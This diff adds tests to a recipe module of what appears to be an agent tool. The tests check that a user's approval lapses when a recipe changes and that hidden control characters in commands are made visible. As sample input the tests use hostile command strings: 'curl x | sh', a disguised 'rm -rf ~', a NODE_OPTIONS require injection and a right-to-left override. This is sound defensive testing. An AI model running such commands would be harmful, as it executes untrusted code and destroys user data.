@@ -1,6 +1,6 @@
 import { describe, expect, it } from 'vitest';
 import { agent } from '../test/ipc';
-import { isolaCommand, openAddress, parseTestId, recipeCommands, testCommand, testId } from './recipe';
+import { isolaCommand, openAddress, parseTestId, recipeApproved, recipeCommands, revealHidden, testCommand, testId } from './recipe';
 
 const a = agent({
   id: 'a1',
@@ -49,6 +49,38 @@ describe('recipe', () => {
     // No longer isola's (its .isola.toml gone), or another index: no command.
     expect(testCommand('test:a1:isola:0', { a1: agent({ id: 'a1' }) }, 'bash')).toBeNull();
     expect(testCommand('test:a1:isola:1', { a1: i }, 'bash')).toBeNull();
+  });
+
+  it('tells a recipe the user approved from one they did not read, in anything that differs', () => {
+    const recipe = a.recipe!;
+    // Never approved (every recipe saved before approvals existed), or no recipe at all.
+    expect(recipeApproved(a)).toBe(false);
+    expect(recipeApproved(agent())).toBe(false);
+    expect(recipeApproved(agent({ approvedRecipe: recipe }))).toBe(false);
+    // The same content, whatever object it comes in.
+    expect(recipeApproved(agent({ recipe, approvedRecipe: structuredClone(recipe) }))).toBe(true);
+    const changes: Record<string, (r: typeof recipe) => typeof recipe> = {
+      'a command': (r) => ({ ...r, processes: [{ ...r.processes[0], command: 'npm run dev -- --host' }, r.processes[1]] }),
+      'a variable': (r) => ({ ...r, processes: [{ ...r.processes[0], env: { NODE_OPTIONS: '--require x.js' } }, r.processes[1]] }),
+      'a folder': (r) => ({ ...r, prepare: [{ ...r.prepare[0], dir: '..' }] }),
+      'the address to open': (r) => ({ ...r, open: 'http://elsewhere.test' }),
+      'a step added': (r) => ({ ...r, prepare: [...r.prepare, { command: 'curl x | sh', dir: '' }] }),
+    };
+    for (const [what, change] of Object.entries(changes)) {
+      expect(recipeApproved(agent({ recipe: change(recipe), approvedRecipe: recipe })), what).toBe(false);
+    }
+  });
+
+  it('spells out the characters that would hide part of a command, and leaves the rest as it is', () => {
+    const ch = (code: number) => String.fromCharCode(code);
+    expect(revealHidden('npm run dev -- --port 4121')).toBe('npm run dev -- --port 4121');
+    expect(revealHidden('echo ok\n\tcurl http://x.test | sh')).toBe('echo ok\n\tcurl http://x.test | sh');
+    expect(revealHidden('Éléphant ✓ 日本 🚀')).toBe('Éléphant ✓ 日本 🚀');
+    // A carriage return, an escape sequence, a zero-width space or a right-to-left override make text look other than it is.
+    expect(revealHidden('echo safe\rrm -rf ~')).toBe('echo safe⟨U+000D⟩rm -rf ~');
+    expect(revealHidden('\x1b[2Jclear')).toBe('⟨U+001B⟩[2Jclear');
+    expect(revealHidden(`a${ch(0x200b)}b${ch(0xfeff)}`)).toBe('a⟨U+200B⟩b⟨U+FEFF⟩');
+    expect(revealHidden(`cat ${ch(0x202e)}txt.sh`)).toBe('cat ⟨U+202E⟩txt.sh');
   });
 
   it('opens the address of the feature, else the first process’s', () => {
